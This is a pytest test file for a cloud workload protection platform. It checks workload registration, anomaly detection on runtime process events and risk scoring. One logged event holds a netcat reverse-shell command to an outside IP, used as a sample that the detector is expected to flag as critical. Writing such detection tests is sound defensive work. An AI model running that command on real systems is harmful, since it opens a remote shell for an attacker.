import pytest
import uuid
from app.cwpp.workload_discovery_engine import WorkloadDiscoveryEngine
from app.cwpp.runtime_visibility_engine import RuntimeVisibilityEngine
from app.cwpp.behavior_analytics_engine import BehaviorAnalyticsEngine
from app.cwpp.workload_risk_engine import WorkloadRiskEngine

pytestmark = pytest.mark.asyncio

async def test_cwpp_workflows(db_session):
    tenant_id = uuid.uuid4()
    
    # 1. Test Discovery
    wde = WorkloadDiscoveryEngine(db_session)
    workload = await wde.register_workload(tenant_id, "CONTAINER", "prod-api-pod", "AWS", "us-east-1")
    
    assert workload.workload_name == "prod-api-pod"
    assert workload.status == "RUNNING"
    
    # 2. Test Normal Event (No Anomaly)
    rve = RuntimeVisibilityEngine(db_session)
    event1 = await rve.log_event(tenant_id, workload.id, "PROCESS_START", "nginx", "nginx -g daemon off;")
    
    bae = BehaviorAnalyticsEngine(db_session)
    anomaly1 = await bae.analyze_event(event1)
    assert anomaly1 is None
    
    # 3. Test Anomalous Event (Reverse Shell)
    event2 = await rve.log_event(tenant_id, workload.id, "PROCESS_START", "sh", "nc -e /bin/sh 1.1.1.1 4444")
    anomaly2 = await bae.analyze_event(event2)
    
    assert anomaly2 is not None
    assert anomaly2.severity == "CRITICAL"
    assert "Reverse Shell" in anomaly2.title
    
    # 4. Test Risk Aggregation
    wre = WorkloadRiskEngine(db_session)
    risk_score = await wre.update_risk_score(tenant_id, workload.id)
    
    assert risk_score.risk_score == 50.0  # 1 CRITICAL anomaly
